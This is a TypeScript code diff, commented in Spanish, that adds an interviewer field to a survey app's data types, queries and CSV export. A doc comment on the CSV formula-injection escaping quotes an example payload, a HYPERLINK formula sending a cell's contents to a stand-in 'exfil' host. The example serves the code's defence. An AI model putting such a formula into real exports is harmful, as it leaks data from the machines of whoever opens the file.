@@ -39,6 +39,8 @@ export interface EncuestaDto {
   id: number;
   idRemoto: string;
   folioLocal: string | null;
+  /** null = registro capturado por una app anterior al campo. */
+  encuestador: string | null;
   estado: EncuestaEstado;
   elegibilidad: EncuestaElegibilidad;
   versionCuestionario: number;
@@ -66,6 +68,7 @@ export interface EncuestaExportRow {
   idRemoto: string;
   idLocal: string;
   folioLocal: string | null;
+  encuestador: string | null;
   recibidoEn: Date;
   fechaHoraInicio: Date;
   fechaHoraFinalizacion: Date;
@@ -110,6 +113,7 @@ const encuestaListSelect = {
   id: true,
   idRemoto: true,
   folioLocal: true,
+  encuestador: true,
   estado: true,
   elegibilidad: true,
   versionCuestionario: true,
@@ -123,7 +127,7 @@ const encuestaListSelect = {
 } as const;
 
 /**
- * Columnas de la exportación: las 39 celdas del CSV y nada más. Es un select
+ * Columnas de la exportación: las 40 celdas del CSV y nada más. Es un select
  * distinto del listado a propósito —el CSV sí lleva los JSONB y el bloque de
  * ubicación completo—, pero comparte con él las dos exclusiones que importan:
  * `payloadRaw` y `payloadHash`.
@@ -133,6 +137,7 @@ const encuestaExportSelect = {
   idRemoto: true,
   idLocal: true,
   folioLocal: true,
+  encuestador: true,
   recibidoEn: true,
   fechaHoraInicio: true,
   fechaHoraFinalizacion: true,
@@ -200,6 +205,7 @@ function toDto(row: EncuestaDto): EncuestaDto {
     id: row.id,
     idRemoto: row.idRemoto,
     folioLocal: row.folioLocal,
+    encuestador: row.encuestador,
     estado: row.estado,
     elegibilidad: row.elegibilidad,
     versionCuestionario: row.versionCuestionario,
@@ -277,6 +283,7 @@ export const ENCUESTAS_CSV_HEADERS = [
   'ID remoto',
   'ID local',
   'Folio',
+  'Encuestador',
   'Recibido (UTC)',
   'Inicio (UTC)',
   'Finalización (UTC)',
@@ -327,9 +334,10 @@ const ARRANQUE_DE_FORMULA = /^[=+\-@\t\r]/;
  * o CR, anteponiéndoles un apóstrofo (la marca de "esto es texto" de Excel) y
  * entrecomillando siempre para que el apóstrofo viaje literal. Aquí hace falta
  * porque varias columnas son texto libre del teléfono —modelo, versión del
- * sistema, versión de la app, folio, identificador del dispositivo— y un equipo
- * con API key válida puede mandar `=HYPERLINK("http://exfil/?"&A2,"ok")` como
- * modelo: la celda se ejecutaría en la máquina del revisor al abrir el archivo.
+ * sistema, versión de la app, folio, encuestador, identificador del
+ * dispositivo— y un equipo con API key válida puede mandar
+ * `=HYPERLINK("http://exfil/?"&A2,"ok")` como modelo: la celda se ejecutaría en
+ * la máquina del revisor al abrir el archivo.
  *
  * Los `number` quedan exentos: `-99.133209` es una coordenada, y prefijarla
  * rompería las columnas de latitud/longitud/precisión que el revisor sí grafica.
@@ -392,6 +400,9 @@ export function toCsvRow(encuesta: EncuestaExportRow): string {
       encuesta.idRemoto,
       encuesta.idLocal,
       encuesta.folioLocal,
+      // Texto libre que teclea el encuestador en el teléfono: pasa por
+      // csvEscape como el resto (comas, comillas y arranque de fórmula).
+      encuesta.encuestador,
       // Todas las fechas en UTC, igual que se persisten: la hora local del
       // revisor no debe cambiar el contenido del archivo.
       encuesta.recibidoEn.toISOString(),
